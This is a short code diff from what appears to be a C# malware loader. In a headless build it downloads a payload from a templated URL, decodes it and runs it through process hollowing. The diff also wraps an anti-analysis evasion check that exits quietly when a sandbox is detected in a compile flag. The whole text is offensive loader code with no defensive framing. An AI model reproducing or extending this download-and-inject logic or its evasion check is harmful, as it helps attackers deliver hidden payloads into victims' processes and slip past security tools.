@@ -132,12 +132,13 @@ await rootCommand.InvokeAsync(args);
 #endif
 
 #if HEADLESS
+#if DISABLE_EVASION
         if(EvasionCheck.Detected)
         {
             Console.WriteLine("Have a nice day!");
             Environment.Exit(0);
         };
-
+#endif
         var httpClient = new HttpClient();
         var data = await httpClient.GetStringAsync("<%URL%>");
         var buf = Decoder.DecodeString(data);
@@ -147,6 +148,7 @@ await rootCommand.InvokeAsync(args);
         await HollowProcess.Run(buf);
 #endif
 #endif
+
 
 
 
